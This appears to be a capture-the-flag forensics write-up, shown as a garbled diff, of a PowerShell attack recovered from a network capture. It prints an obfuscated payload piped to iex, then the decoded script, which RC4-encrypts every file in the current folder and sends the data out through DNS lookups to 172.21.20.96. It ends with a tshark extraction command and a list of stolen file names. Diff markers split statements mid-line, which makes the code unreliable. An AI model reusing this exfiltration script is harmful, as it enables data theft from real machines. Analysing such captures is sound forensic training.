${)}${]}${~=}+  ${)}${~}${]}+  ${)}${~=}${;+}${~=}+  ${)}${![/}${]}+  ${)}${](}${]}  +${)}${~=}${;+}${~=}+${)}${~=}${~=}${;+}+${)}${~=}${;+}${~}+  ${)}${~=}${~=}${]}+${)}${~=}${;+}${![/}  +  ${)}${$] }${@$/}  +  ${)}${~}${@[}+${)}${~}${]}+  ${)}${~=}${~=}${![/}  +${)}${]}${~=}+  ${)}${~}${![/}  +${)}${~}${![/}  +${)}${$] }${@$/}  +  ${)}${~}${@[}  +${)}${~}${]}+  ${)}${~=}${~=}${;+}+${)}${]}${~=}+  ${)}${![/}${'$[}  +  ${)}${$] }${@$/}  +  ${)}${~}${@[}  +  ${)}${~=}${~=}${@$/}+${)}${~=}${;+}${![/}+${)}${~=}${;+}${$] }+  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${;+}${~=}+${)}${~}${@[}  +${)}${![/}${;+}  +  ${)}${~}${]}+${)}${~=}${~=}${;+}+  ${)}${~}${@[}  +  ${)}${![/}${$] }+${)}${~=}${;+}${'$[}  +${)}${~=}${;+}${~=}  +  ${)}${~}${@[}+${)}${![/}${;+}+  ${)}${~}${]}  +  ${)}${~=}${;+}${'$[}+${)}${![/}${](}  +${)}${~}${]}  +  ${)}${@$/}${'$[}+${)}${![/}${~=}  +  ${)}${![/}${~=}  +${)}${~}${@[}+${)}${~=}${@[}${~}  +${)}${~}${@[}  +${)}${~}${]}  +  ${)}${@$/}${@$/}  +  ${)}${]}${~=}  +  ${)}${~}${]}  +${)}${@$/}${'$[}  +  ${)}${$] }${@$/}+${)}${~}${@[}  +${)}${~=}${;+}${$] }  +  ${)}${~=}${;+}${@[}  +${)}${~}${@[}+${)}${![/}${;+}  +${)}${![/}${;+}  +  ${)}${~}${]}+  ${)}${~=}${~=}${;+}+  ${)}${![/}${@[}  +  ${)}${~}${]}  +${)}${@$/}${'$[}+${)}${![/}${~=}  +${)}${![/}${~}+${)}${~}${]}  +  ${)}${@$/}${@$/}  +${)}${~}${@[}  +${)}${![/}${$] }  +${)}${~=}${;+}${~}+${)}${~=}${~=}${]}  +  ${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${;+}${'$[}  +${)}${![/}${~=}+${)}${~}${@[}  +  ${)}${~=}${@[}${~}+${)}${~}${@[}+  ${)}${~}${]}  +  ${)}${@$/}${@$/}+${)}${]}${~=}  +  ${)}${~}${]}  +  ${)}${~=}${;+}${'$[}  +${)}${![/}${$] }  +${)}${![/}${;+}+  ${)}${~}${]}+  ${)}${~=}${~=}${;+}+  ${)}${![/}${@[}+${)}${~}${]}  +  ${)}${@$/}${'$[}  +  ${)}${![/}${~=}+${)}${~}${@[}+${)}${~=}${@[}${$] }  +  ${)}${$] }${@$/}  +${)}${~}${@[}  +${)}${~}${]}+  ${)}${~=}${~=}${![/}  +${)}${![/}${~}+${)}${]}${~=}+  ${)}${~}${]}+  ${)}${~=}${;+}${~=}  +  ${)}${![/}${]}  +${)}${'$[}${~}+${)}${~=}${~=}${](}  +  ${)}${@$/}${'$[}  +  ${)}${~=}${~=}${$] }+${)}${~=}${~=}${]}  +  ${)}${~=}${~=}${![/}  +${)}${~=}${;+}${$] }+${)}${~=}${~=}${;+}+  ${)}${~=}${;+}${~}  +${)}${![/}${;+}+${)}${~}${]}  +${)}${~=}${~=}${;+}+${)}${![/}${@[}+  ${)}${~}${]}  +${)}${@$/}${'$[}  +  ${)}${![/}${![/}+  ${)}${~}${@[}+  ${)}${~}${]}+  ${)}${@$/}${@$/}  +${)}${![/}${~=}  +${)}${~}${@[}+${)}${![/}${~}+${)}${~}${@[}  +  ${)}${~}${![/}+  ${)}${![/}${]}  +  ${)}${~}${![/}+${)}${$] }${@$/}+  ${)}${~}${@[}+${)}${~=}${;+}${$] }+${)}${~=}${;+}${@[}  +${)}${~}${@[}+${)}${![/}${;+}+  ${)}${![/}${;+}  +  ${)}${~}${]}+  ${)}${~=}${~=}${;+}  +  ${)}${~}${](}+  ${)}${~}${]}  +  ${)}${~=}${~=}${$] }  +  ${)}${![/}${~=}  +  ${)}${~}${@[}+  ${)}${![/}${$] }  +  ${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${~}  +${)}${~}${@[}+${)}${![/}${;+}+${)}${~}${]}+  ${)}${~=}${~=}${$] }+${)}${![/}${$] }  +${)}${![/}${@$/}+  ${)}${![/}${~=}  +  ${)}${![/}${~=}+${)}${~}${@[}  +  ${)}${~=}${@[}${~}+  ${)}${~}${@[}+${)}${~=}${~=}${;+}+${)}${~=}${~=}${$] }+  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${~=}${~=}  +${)}${~=}${~=}${~=}+${)}${~=}${;+}${](}+${)}${~=}${~=}${](}  +${)}${~=}${~=}${@[}+${)}${~}${@[}  +${)}${![/}${$] }+  ${)}${~=}${~=}${]}+  ${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${@[}  +  ${)}${~=}${;+}${~=}+  ${)}${]}${~=}+${)}${]}${$] }  +  ${)}${~}${@[}  +  ${)}${~}${]}+${)}${~=}${~=}${![/}  +${)}${~}${]}  +${)}${@$/}${](}  +  ${)}${![/}${]}+  ${)}${~}${@[}  +  ${)}${~}${]}+${)}${~=}${;+}${;+}  +  ${)}${$] }${@$/}  +${)}${~}${@[}+  ${)}${~}${]}  +${)}${~=}${~=}${![/}+  ${)}${]}${~=}+${)}${~}${![/}  +${)}${~}${![/}  +${)}${~}${@[}+  ${)}${~=}${@[}${$] }+${)}${~}${@[}  +${)}${~}${]}  +${)}${~=}${~=}${;+}  +${)}${]}${~=}+  ${)}${~}${]}+${)}${~=}${~=}${;+}  +${)}${![/}${~}  +  ${)}${![/}${@$/}+${)}${~}${@[}+${)}${~=}${@[}${$] }  +  ${)}${~}${@[}  +  ${)}${~=}${~=}${;+}+${)}${~=}${~=}${$] }  +  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${~=}${~=}+${)}${~=}${~=}${~=}+${)}${~=}${;+}${](}  +  ${)}${~=}${~=}${](}+  ${)}${~=}${~=}${@[}  +${)}${~}${@[}+  ${)}${![/}${$] }+${)}${~=}${~=}${]}  +  ${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${@[}+  ${)}${~=}${;+}${~=}  +  ${)}${]}${~=}+  ${)}${]}${$] }+${)}${~}${@[}+  ${)}${~}${]}  +  ${)}${~=}${~=}${![/}+  ${)}${~}${]}  +${)}${@$/}${](}  +${)}${![/}${]}  +  ${)}${~}${@[}  +  ${)}${~}${]}  +${)}${~=}${;+}${;+}  +${)}${~}${@[}+  ${)}${~=}${@[}${$] }  |  ${;@!}  "  |&  ${;@!}
-```
-
-
-
-```
 [CHar]36+[CHar]100+[CHar]61  +[CHar]34  +[CHar]49  +[CHar]55+  [CHar]50  +[CHar]46+[CHar]50+  [CHar]49  +[CHar]46+[CHar]50  +  [CHar]48+[CHar]46+[CHar]57+[CHar]54  +[CHar]34  +[CHar]59  +[CHar]32+  [CHar]36+[CHar]115  +  [CHar]61+  [CHar]52  +  [CHar]59+  [CHar]32  +  [CHar]36+[CHar]98  +[CHar]61+  [CHar]53  +  [CHar]55  +  [CHar]59  +[CHar]32  +[CHar]71+  [CHar]101+  [CHar]116  +[CHar]45  +[CHar]67+  [CHar]104+[CHar]105+  [CHar]108  +[CHar]100  +[CHar]73  +  [CHar]116+[CHar]101+[CHar]109+  [CHar]32  +  [CHar]34  +[CHar]46  +[CHar]34+  [CHar]32+  [CHar]124+  [CHar]32  +[CHar]70+  [CHar]111+[CHar]114+[CHar]101  +[CHar]97+[CHar]99+[CHar]104+[CHar]45+  [CHar]79+[CHar]98  +[CHar]106+  [CHar]101  +[CHar]99  +  [CHar]116+  [CHar]32  +[CHar]123  +  [CHar]36  +  [CHar]97+[CHar]61+  [CHar]91  +  [CHar]83  +  [CHar]121+[CHar]115  +  [CHar]116+[CHar]101+  [CHar]109  +  [CHar]46+[CHar]67+  [CHar]111+  [CHar]110+  [CHar]118+  [CHar]101+  [CHar]114+[CHar]116  +[CHar]93  +[CHar]58+  [CHar]58+  [CHar]84+[CHar]111+  [CHar]66+[CHar]97  +[CHar]115+  [CHar]101+[CHar]54  +  [CHar]52+[CHar]83  +[CHar]116  +  [CHar]114+  [CHar]105+[CHar]110+  [CHar]103+  [CHar]40+  [CHar]36+[CHar]69  +[CHar]110+  [CHar]99  +  [CHar]46+[CHar]71  +[CHar]101  +  [CHar]116  +  [CHar]66+  [CHar]121+[CHar]116+[CHar]101  +[CHar]115+[CHar]40  +[CHar]36  +  [CHar]95  +  [CHar]46+  [CHar]78+  [CHar]97  +[CHar]109  +[CHar]101+[CHar]41+  [CHar]41  +[CHar]59+  [CHar]32  +[CHar]36+[CHar]82+[CHar]61  +  [CHar]123+[CHar]36  +[CHar]68  +  [CHar]44  +[CHar]36  +  [CHar]75  +[CHar]61  +[CHar]36+[CHar]65+[CHar]114  +  [CHar]103  +[CHar]115+[CHar]59  +[CHar]36+  [CHar]83+[CHar]61+  [CHar]48+[CHar]46+  [CHar]46  +  [CHar]50  +  [CHar]53  +[CHar]53  +[CHar]59  +  [CHar]48  +[CHar]46+[CHar]46  +  [CHar]50+  [CHar]53+  [CHar]53  +[CHar]124  +[CHar]37+[CHar]123  +[CHar]36  +  [CHar]74  +[CHar]61  +[CHar]40+[CHar]36+[CHar]74+[CHar]43  +  [CHar]36  +  [CHar]83+  [CHar]91+  [CHar]36+[CHar]95+[CHar]93+  [CHar]43  +  [CHar]36  +  [CHar]75  +[CHar]91  +[CHar]36  +[CHar]95+  [CHar]37  +[CHar]36  +  [CHar]75  +  [CHar]46+[CHar]76  +[CHar]101+[CHar]110  +  [CHar]103+  [CHar]116  +[CHar]104  +[CHar]93+[CHar]41+  [CHar]37+[CHar]50+[CHar]53+[CHar]54  +  [CHar]59  +  [CHar]36+[CHar]83+  [CHar]91+  [CHar]36  +  [CHar]95  +[CHar]93  +  [CHar]44  +  [CHar]36  +[CHar]83+[CHar]91  +[CHar]36+  [CHar]74+  [CHar]93  +[CHar]61+[CHar]36+  [CHar]83+[CHar]91+[CHar]36  +  [CHar]74  +[CHar]93+  [CHar]44  +  [CHar]36  +  [CHar]83  +[CHar]91  +[CHar]36  +[CHar]95  +  [CHar]93  +[CHar]125+[CHar]59  +  [CHar]36+  [CHar]68+  [CHar]124+[CHar]37  +  [CHar]123  +[CHar]36  +[CHar]73+[CHar]61  +[CHar]40+  [CHar]36+  [CHar]73  +  [CHar]43+  [CHar]49+  [CHar]41  +  [CHar]37  +[CHar]50  +[CHar]53+[CHar]54+  [CHar]59+  [CHar]36+  [CHar]72  +[CHar]61+[CHar]40+  [CHar]36  +[CHar]72+  [CHar]43  +[CHar]36+[CHar]83+  [CHar]91  +  [CHar]36+[CHar]73+[CHar]93+[CHar]41  +  [CHar]37  +[CHar]50+  [CHar]53  +  [CHar]54  +[CHar]59+[CHar]36  +[CHar]83+[CHar]91+  [CHar]36  +[CHar]73+[CHar]93+[CHar]44+  [CHar]36+  [CHar]83+  [CHar]91+  [CHar]36+  [CHar]72  +[CHar]93  +  [CHar]61  +[CHar]36+[CHar]83+  [CHar]91  +  [CHar]36+[CHar]72+[CHar]93+  [CHar]44  +  [CHar]36+  [CHar]83  +[CHar]91+  [CHar]36  +  [CHar]73+[CHar]93  +  [CHar]59  +  [CHar]36  +  [CHar]95  +[CHar]45+  [CHar]98+[CHar]120+  [CHar]111  +  [CHar]114+  [CHar]36+  [CHar]83+[CHar]91+  [CHar]40+  [CHar]36+[CHar]83+[CHar]91+  [CHar]36+  [CHar]73  +[CHar]93  +[CHar]43  +  [CHar]36+  [CHar]83  +[CHar]91+[CHar]36  +[CHar]72+[CHar]93  +  [CHar]41+  [CHar]37  +  [CHar]50+  [CHar]53  +  [CHar]54  +[CHar]93+  [CHar]125+  [CHar]125+  [CHar]59+  [CHar]32  +[CHar]36  +  [CHar]69  +[CHar]110  +  [CHar]99+  [CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]91+[CHar]83  +[CHar]121  +  [CHar]115+  [CHar]116  +  [CHar]101  +[CHar]109+  [CHar]46+[CHar]84+[CHar]101+[CHar]120  +  [CHar]116  +[CHar]46  +  [CHar]69  +  [CHar]110  +  [CHar]99+[CHar]111  +[CHar]100  +  [CHar]105+  [CHar]110  +[CHar]103+  [CHar]93+[CHar]58+[CHar]58+  [CHar]65  +  [CHar]83+  [CHar]67+[CHar]73+  [CHar]73  +  [CHar]59  +[CHar]32+[CHar]36  +[CHar]112+[CHar]32+  [CHar]61  +[CHar]32+  [CHar]36+  [CHar]69+  [CHar]110+  [CHar]99+  [CHar]46  +[CHar]71  +[CHar]101  +[CHar]116  +[CHar]66+  [CHar]121+[CHar]116+[CHar]101  +  [CHar]115+[CHar]40  +[CHar]39+[CHar]91+  [CHar]83  +  [CHar]121  +[CHar]115  +  [CHar]116  +  [CHar]101  +[CHar]109+  [CHar]46  +  [CHar]73+[CHar]79+  [CHar]46+  [CHar]70+[CHar]105+  [CHar]108+  [CHar]101  +[CHar]93  +  [CHar]58+  [CHar]58+  [CHar]82+  [CHar]101  +  [CHar]97  +[CHar]100+  [CHar]65+  [CHar]108  +  [CHar]108+[CHar]66  +[CHar]121+[CHar]116  +  [CHar]101  +  [CHar]115  +  [CHar]40  +  [CHar]36  +[CHar]95+[CHar]46  +[CHar]70+[CHar]117+[CHar]108+[CHar]108+[CHar]78  +  [CHar]97  +  [CHar]109  +  [CHar]101+  [CHar]41  +[CHar]39  +  [CHar]41  +  [CHar]59+[CHar]32  +  [CHar]36  +[CHar]122  +[CHar]32+  [CHar]61  +[CHar]32  +  [CHar]36+  [CHar]69+  [CHar]110+  [CHar]99  +[CHar]46  +[CHar]71  +[CHar]101  +  [CHar]116  +[CHar]66  +  [CHar]121  +[CHar]116+  [CHar]101  +[CHar]115  +[CHar]40+[CHar]91+  [CHar]83  +  [CHar]121+  [CHar]115+  [CHar]116  +[CHar]101+[CHar]109+  [CHar]46  +  [CHar]73+[CHar]79+  [CHar]46  +[CHar]70  +[CHar]105  +  [CHar]108+[CHar]101  +  [CHar]93+  [CHar]58+[CHar]58  +[CHar]82  +  [CHar]101  +[CHar]97+  [CHar]100  +[CHar]65  +[CHar]108  +  [CHar]108  +[CHar]66+[CHar]121+  [CHar]116  +[CHar]101  +[CHar]115+  [CHar]40+[CHar]36  +  [CHar]95  +  [CHar]46  +  [CHar]70  +[CHar]117  +[CHar]108+  [CHar]108  +  [CHar]78+[CHar]97+[CHar]109  +  [CHar]101  +[CHar]41+[CHar]41  +  [CHar]59  +[CHar]32  +[CHar]36  +[CHar]117  +[CHar]32+[CHar]61  +[CHar]32  +  [CHar]40+  [CHar]38  +  [CHar]32+[CHar]36+[CHar]82+[CHar]32  +[CHar]36  +[CHar]122  +[CHar]32+  [CHar]36+[CHar]112  +  [CHar]41+  [CHar]59+[CHar]32+  [CHar]36+[CHar]101  +  [CHar]32  +[CHar]61+[CHar]32+[CHar]91+  [CHar]83  +[CHar]121  +  [CHar]115+[CHar]116+  [CHar]101+[CHar]109  +[CHar]46  +[CHar]67  +[CHar]111  +[CHar]110+[CHar]118  +  [CHar]101+[CHar]114  +  [CHar]116  +  [CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]66+[CHar]97  +  [CHar]115  +[CHar]101  +[CHar]54+[CHar]52  +[CHar]83+  [CHar]116  +[CHar]114  +[CHar]105  +[CHar]110  +  [CHar]103+  [CHar]40  +  [CHar]36+[CHar]117  +  [CHar]41  +[CHar]59  +  [CHar]32  +  [CHar]36+  [CHar]108  +  [CHar]61+  [CHar]36+  [CHar]101+  [CHar]46+  [CHar]76  +[CHar]101+[CHar]110+[CHar]103+  [CHar]116+[CHar]104  +  [CHar]59  +  [CHar]32+[CHar]36+  [CHar]114  +[CHar]61+  [CHar]34  +[CHar]34  +[CHar]59  +  [CHar]32  +[CHar]36+  [CHar]110+[CHar]61+  [CHar]48  +  [CHar]59  +  [CHar]32  +  [CHar]119+[CHar]104+[CHar]105+  [CHar]108  +  [CHar]101+[CHar]32  +[CHar]40  +  [CHar]36+[CHar]110+  [CHar]32  +  [CHar]45+[CHar]108  +[CHar]101  +  [CHar]32+[CHar]40+  [CHar]36  +  [CHar]108+[CHar]47  +[CHar]36  +  [CHar]98+[CHar]41  +  [CHar]41  +[CHar]32+[CHar]123  +[CHar]32  +[CHar]36  +  [CHar]99  +  [CHar]61  +  [CHar]36  +[CHar]98  +  [CHar]59+[CHar]32  +[CHar]105  +  [CHar]102  +[CHar]32+[CHar]40  +[CHar]40  +  [CHar]36+  [CHar]110+  [CHar]42  +  [CHar]36  +[CHar]98+[CHar]41  +[CHar]43+[CHar]36  +  [CHar]99  +[CHar]32  +[CHar]45  +[CHar]103+[CHar]116  +  [CHar]32+  [CHar]36+[CHar]108  +[CHar]41+[CHar]32  +  [CHar]123+[CHar]32+  [CHar]36  +  [CHar]99+[CHar]61  +  [CHar]36  +  [CHar]108  +[CHar]45  +[CHar]40+  [CHar]36+  [CHar]110+  [CHar]42+[CHar]36  +  [CHar]98  +  [CHar]41+[CHar]32+[CHar]125  +  [CHar]59  +[CHar]32  +[CHar]36+  [CHar]114  +[CHar]43+[CHar]61+  [CHar]36+  [CHar]101  +  [CHar]46  +[CHar]83+[CHar]117  +  [CHar]98  +  [CHar]115+[CHar]116  +  [CHar]114  +[CHar]105+[CHar]110+  [CHar]103  +[CHar]40+[CHar]36  +[CHar]110+[CHar]42+  [CHar]36  +[CHar]98  +  [CHar]44+  [CHar]32+  [CHar]36+  [CHar]99  +[CHar]41  +[CHar]32+[CHar]43+[CHar]32  +  [CHar]34+  [CHar]46  +  [CHar]34+[CHar]59+  [CHar]32+[CHar]105+[CHar]102  +[CHar]32+[CHar]40+  [CHar]40  +  [CHar]36+  [CHar]110  +  [CHar]37+  [CHar]36  +  [CHar]115  +  [CHar]41  +  [CHar]32+  [CHar]45  +  [CHar]101  +  [CHar]113  +[CHar]32+[CHar]40+[CHar]36+  [CHar]115+[CHar]45  +[CHar]49+  [CHar]41  +  [CHar]41+[CHar]32  +  [CHar]123+  [CHar]32+[CHar]110+[CHar]115+  [CHar]108  +  [CHar]111  +[CHar]111+[CHar]107+[CHar]117  +[CHar]112+[CHar]32  +[CHar]45+  [CHar]116+  [CHar]121+  [CHar]112  +  [CHar]101+  [CHar]61+[CHar]65  +  [CHar]32  +  [CHar]36+[CHar]114  +[CHar]36  +[CHar]97  +  [CHar]46+  [CHar]32  +  [CHar]36+[CHar]100  +  [CHar]59  +[CHar]32+  [CHar]36  +[CHar]114+  [CHar]61+[CHar]34  +[CHar]34  +[CHar]32+  [CHar]125+[CHar]32  +[CHar]36  +[CHar]110  +[CHar]61+  [CHar]36+[CHar]110  +[CHar]43  +  [CHar]49+[CHar]32+[CHar]125  +  [CHar]32  +  [CHar]110+[CHar]115  +  [CHar]108  +  [CHar]111+[CHar]111+[CHar]107  +  [CHar]117+  [CHar]112  +[CHar]32+  [CHar]45+[CHar]116  +  [CHar]121+  [CHar]112+  [CHar]101  +  [CHar]61+  [CHar]65+[CHar]32+  [CHar]36  +  [CHar]114+  [CHar]36  +[CHar]97  +[CHar]46  +  [CHar]32  +  [CHar]36  +[CHar]100  +[CHar]32+  [CHar]125  |  iex
-```
-
-
-
-```
 $d="172.21.20.96"; 
 $s=4; 
 $b=57; 
 Get-ChildItem "." | Foreach-Object {
-    $a=[System.Convert]::ToBase64String($Enc.GetBytes($_.Name)); 
+    $a=[System.Convert]::
+ToBase64String($Enc.GetBytes($_.Name)); 
     $R={
         $D,$K=$Args;
         $S=0..255;0..255|%{
@@ -2423,11 +2322,15 @@ Get-ChildItem "." | Foreach-Object {
             $_-bxor$S[($S[$I]+$S[$H])%256]
         }
     }; 
-    $Enc = [System.Text.Encoding]::ASCII; 
-    $p = $Enc.GetBytes('[System.IO.File]::ReadAllBytes($_.FullName)'); 
-    $z = $Enc.GetBytes([System.IO.File]::ReadAllBytes($_.FullName)); 
+    $Enc = [System.Text.Encoding]::
+ASCII; 
+    $p = $Enc.GetBytes('[System.IO.File]::
+ReadAllBytes($_.FullName)'); 
+    $z = $Enc.GetBytes([System.IO.File]::
+ReadAllBytes($_.FullName)); 
     $u = (& $R $z $p); 
-    $e = [System.Convert]::ToBase64String($u); 
+    $e = [System.Convert]::
+ToBase64String($u); 
     $l=$e.Length; 
     $r=""; 
     $n=0; 
@@ -2444,17 +2347,7 @@ Get-ChildItem "." | Foreach-Object {
     } 
     nslookup -type=A $r$a. $d 
 }
-```
-
-
-
-```
 tshark -r HiddenGem.pcapng -T fields -e dns.resp.name | sed '/^s*$/d' > 1.txt
-```
-
-
-
-```
 des.txt
 KCSC.jpg
 SecretPlan.pdf
